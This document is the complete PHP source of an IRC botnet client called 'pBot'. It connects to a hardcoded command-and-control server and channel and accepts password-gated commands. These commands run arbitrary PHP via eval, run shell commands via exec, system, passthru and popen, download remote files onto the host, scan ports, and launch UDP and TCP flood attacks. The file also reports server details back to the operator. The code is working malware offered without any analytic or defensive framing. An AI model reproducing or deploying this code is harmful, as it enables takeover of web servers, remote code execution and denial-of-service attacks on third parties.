<?php
set_time_limit(0);
error_reporting(0);
echo "pVd5c9pIFv97XeXv0NFm <br>";

class pBot {

 var $config = array("server"=>"216.218.237.30",
                     "port"=>"7721",
                     "pass"=>"",
                     "maxrand"=>"1",
                     "chan"=>"#idle",
                     "key"=>".",
                     "modes"=>"+R",
                     "password"=>"19a02ca47d39bf836b9d8f6c7d387aba",
                     "trigger"=>".",
                     "hostauth"=>"19a02ca47d39bf836b9d8f6c7d387aba");
                      var $users = array(); 
					  
 function start() 
 { 
    if(!($this->conn = fsockopen($this->config["server"],$this->config["port"],$e,$s,30))) 
       $this->start(); 
	$this->set_ident();
    $alph = range("0","9");
    for($i=0;$i<$this->config["maxrand"];$i++) 
    if(strlen($this->config["pass"])>0) 
       $this->send("PASS ".$this->config["pass"]);
    $this->set_nick();
    $this->main();
 } 
 
 function main() 
 { 
    while(!feof($this->conn)) 
    { 
       $this->buf = trim(fgets($this->conn,512)); 
       $cmd = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->send("PONG :".substr($this->buf,6)); 
       } 
       if(isset($cmd[1]) && $cmd[1] =="001") 
       { 
          $this->send("MODE ".$this->nick." ".$this->config["modes"]); 
          $this->send("JOIN ".$this->config["chan"]." ".$this->config["key"]."");
          $this->join($this->config["chan"],$this->config["key"]);
       } 
	   if(isset($cmd[1]) && $cmd[1] =="002") 
       { 
	      $this->send("JOIN ".$this->config["chan"]." ".$this->config["key"]."");
          $this->join($this->config["chan"],$this->config["key"]);
		  $this->hostinfo();
	   }
	   if(isset($cmd[1]) && $cmd[1] =="003") 
       { 
	   	  $this->send("JOIN ".$this->config["chan"]." ".$this->config["key"]."");
          $this->join($this->config["chan"],$this->config["key"]);
	   }
   	   if(isset($cmd[1]) && $cmd[1] =="004") 
       { 
	   	  $this->send("JOIN ".$this->config["chan"]." ".$this->config["key"]."");
          $this->join($this->config["chan"],$this->config["key"]);
	   }
	   if(isset($cmd[1]) && $cmd[1] =="005") 
       { 
	   	  $this->send("JOIN ".$this->config["chan"]." ".$this->config["key"]."");
          $this->join($this->config["chan"],$this->config["key"]);
	   }
       if(isset($cmd[1]) && $cmd[1]=="433") 
       { 
          $this->set_nick(); 
       } 
       if($this->buf != $old_buf) 
       { 
          $mcmd = array(); 
          $msg = substr(strstr($this->buf," :"),2); 
          $msgcmd = explode(" ",$msg); 
          $nick = explode("!",$cmd[0]); 
          $vhost = explode("@",$nick[1]); 
          $vhost = $vhost[1]; 
          $nick = substr($nick[0],1); 
          $host = $cmd[0]; 
          if($msgcmd[0]==$this->nick) 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i]; 
          } 
          if(count($cmd)>2) 
          { 
             switch($cmd[1]) 
             { 
                case "QUIT": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PART": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->is_logged_in($host) && (md5($vhost) == $this->config["hostauth"] || $this->config["hostauth"] == "*")) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "user": 
                              if(md5($mcmd[1])==$this->config["password"]) 
                              { 
                                 $this->log_in($host);
                              } 
                              else 
                              { 
                                 $this->notice($this->config["chan"],"[\2Auth\2]: Foute password $nick idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   } 
                   elseif($this->is_logged_in($host)) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "restart": 
                               $this->send("QUIT :gerestart door $nick");
                               fclose($this->conn); 
                               $this->start(); 
                            break; 
                            case "dns": 
                               if(isset($mcmd[1])) 
                               { 
                                  $ip = explode(".",$mcmd[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->privmsg($this->config["chan"],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config["chan"],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1])); 
                                  } 
                               } 
                            break; 
                            case "info":
								$this->hostinfo();
                            break;
                            case "rndnick": 
                               $this->set_nick(); 
                            break; 
                            case "raw":
                               $this->send(strstr($msg,$mcmd[1])); 
                            break; 
                            case "eval":
                              $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));
                            break;
			                case "sexec":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config["chan"],"      : ".trim($ret[$i])); 
                            break; 
                            case "exec": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config["chan"],"      : ".trim($ret[$i])); 
                            break;
                            case "passthru": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 

                               $exec = passthru($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config["chan"],"      : ".trim($ret[$i])); 
                            break; 
                            case "popen": 
                               if(isset($mcmd[1])) 
                               { 
                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                                  $this->privmsg($this->config["chan"],"[\2popen\2]: $command");
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->privmsg($this->config["chan"],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               }  

                            case "system": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = system($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config["chan"],"      : ".trim($ret[$i])); 
                            break; 
                            case "pscan": // .pscan 127.0.0.1 6667 
                               if(count($mcmd) > 2) 
                               { 
                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15)) 
                                     $this->privmsg($this->config["chan"],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2"); 
                                  else 
                                     $this->privmsg($this->config["chan"],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2"); 
                               } 
                            break; 
                            case "download": 
                               if(count($mcmd) > 2) 
                               { 
                                  if(!$fp = fopen($mcmd[2],"w")) 
                                  {  
                                     $this->privmsg($this->config["chan"],"[download:]\00314 Kon bestand niet downloaden. Toestemming geweigerd."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($mcmd[1])) 
                                     { 
                                        $this->privmsg($this->config["chan"],"[download:]\00314 Kan bestand \2".$mcmd[1]."\2 niet downloaden."); 
                                     } 
                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->privmsg($this->config["chan"],"[download:]\00314 Bestand \2".$mcmd[1]."\2 gedownload naar \2".$mcmd[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               }
                               else { $this->privmsg($this->config["chan"],"[download:]\00314 Typ \".download http://your.host/file /tmp/file\""); }
                            break; 
							
                            case "die": 
                               $this->send("QUIT :die command from $nick");
                               fclose($this->conn); 
                               exit; 
 
							   
                            case "logout": 
                               $this->log_out($host); 
                               $this->privmsg($this->config["chan"],"[auth:]\00314 Je bent nu uitgelogt $nick"); 
                            break; 
							
                            case "udpflood": 
                               if(count($mcmd)>3) 
                               { 
                                  $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); 
                               } 
                            break; 
							
                            case "tcpflood": 
                               if(count($mcmd)>5) 
                               { 
                                  $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); 
                               } 
                            break; 
                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->start(); 
 } 
 function send($msg) 
 { 
    fwrite($this->conn,"$msg\r\n"); 
 } 
 function join($chan,$key=NULL) 
 { 
    $this->send("JOIN $chan $key"); 
 } 
 function privmsg($to,$msg)
 {
    $this->send("PRIVMSG $to :$msg");
 }
 function notice($to,$msg)
 {
    $this->send("NOTICE $to :$msg");
 }
 function is_logged_in($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 } 
 function log_in($host) 
 { 
    $this->users[$host] = true; 
 } 
 function log_out($host) 
 { 
    unset($this->users[$host]); 
 } 
function set_nick() {
  $nicky=array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
  $this->nick = $nicky[rand(0,count($nicky) - 1)];
  $this->nick1 = $nicky[rand(0,count($nicky) - 1)];
  $this->nick2 = $nicky[rand(0,count($nicky) - 1)];
  $this->nick3 = $nicky[rand(0,count($nicky) - 1)];
  $this->nick4 = $nicky[rand(0,count($nicky) - 1)];
  $this->nick5 = $nicky[rand(0,count($nicky) - 1)];
  $this->nick6 = $nicky[rand(0,count($nicky) - 1)];
  for($i=0;$i<$this->config["maxrand"];$i++) 
  $this->send("NICK [".rand(100, 99999)."]".$this->nick.$this->nick1.$this->nick2.$this->nick3.$this->nick4.$this->nick5.$this->nick6."");
 } 

function set_ident() {
  $prify=array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"); 
  $ident = $prify[rand(0,count($prify) - 1)];
  if(php_uname() == "") { $uname = "---"; }
  else { $uname = php_uname(); }
  $this->send("USER ".rand(100, 99999).$ident." 127.0.0.1 localhost :".$uname."");
 }

function udpflood($host,$packetsize,$time) {
	$this->privmsg($this->config["chan"],"[\2UdpFlood Started!\2]"); 
	$packet = "";
	for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
	$timei = time();
	$i = 0;
	while(time()-$timei < $time) {
		$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
      	fwrite($fp,$packet);
       	fclose($fp);
		$i++;
	}
	$env = $i * $packetsize;
	$env = $env / 1048576;
	$vel = $env / $time;
	$vel = round($vel);
	$env = round($env);
	$this->privmsg($this->config["chan"],"[\2UdpFlood Finished!\2]: $env MB enviados / Media: $vel MB/s ");
}
 function tcpflood($host,$packets,$packetsize,$port,$delay) 
 { 
    $this->privmsg($this->config["chan"],"[\2TcpFlood Started!\2]"); 
    $packet = ""; 
    for($i=0;$i<$packetsize;$i++) 
       $packet .= chr(mt_rand(1,256)); 
    for($i=0;$i<$packets;$i++) 
    { 
       if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5)) 
       { 
          $this->privmsg($this->config["chan"],"[\2TcpFlood\2]: Error: <$e>"); 
          return 0; 
       } 
       else 
       { 
          fwrite($fp,$packet); 
          fclose($fp); 
       } 
       sleep($delay); 
    } 
    $this->privmsg($this->config["chan"],"[\2TcpFlood Finished!\2]: Config - $packets pacotes para $host:$port."); 
 }
 
function hostinfo() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "\0034ON\003"; }
    else { $safemode = "\0039OFF\003"; }

	$unme = php_uname();
	if($unme == "") { $mname = "\00315---\003"; }
	else { $mname = "\00315".$unme."\003"; }
		 
	 $url = "\00315http://".$_SERVER["SERVER_NAME"]."".$_SERVER["REQUEST_URI"]."\003";
	 $pth = "\00315".getcwd()."\003";
		  
	$pthh =  getcwd()."";
	$perms = fileperms("$pthh");

	if (($perms & 0xC000) == 0xC000) { $info = "s";
	} elseif (($perms & 0xA000) == 0xA000) { $info = "l";
	} elseif (($perms & 0x8000) == 0x8000) { $info = "-";
	} elseif (($perms & 0x6000) == 0x6000) { $info = "b";
	} elseif (($perms & 0x4000) == 0x4000) { $info = "d";
	} elseif (($perms & 0x2000) == 0x2000) { $info = "c";
	} elseif (($perms & 0x1000) == 0x1000) { $info = "p";
	} else { $info = "u"; }

	// Owner
	$info .= (($perms & 0x0100) ? "r" : "-");
	$info .= (($perms & 0x0080) ? "w" : "-");
	$info .= (($perms & 0x0040) ?
			(($perms & 0x0800) ? "s" : "x" ) :
			(($perms & 0x0800) ? "S" : "-"));
	// Group
	$info .= (($perms & 0x0020) ? "r" : "-");
	$info .= (($perms & 0x0010) ? "w" : "-");
	$info .= (($perms & 0x0008) ?
			(($perms & 0x0400) ? "s" : "x" ) :
			(($perms & 0x0400) ? "S" : "-"));
	// World
	$info .= (($perms & 0x0004) ? "r" : "-");
	$info .= (($perms & 0x0002) ? "w" : "-");
	$info .= (($perms & 0x0001) ?
			(($perms & 0x0200) ? "t" : "x" ) :
			(($perms & 0x0200) ? "T" : "-"));
			
	$rghts = "\00315".$info."\003";

	$this->privmsg($this->config["chan"],"\00314[SAFE:\003\2 $safemode\2\00314]\00315 $url \00314[pwd:]\00315 $pth \00314(\003$rghts\00314) [uname:]\00315 $mname");
	}
 }
$bot = new pBot;
$bot->start(); ?>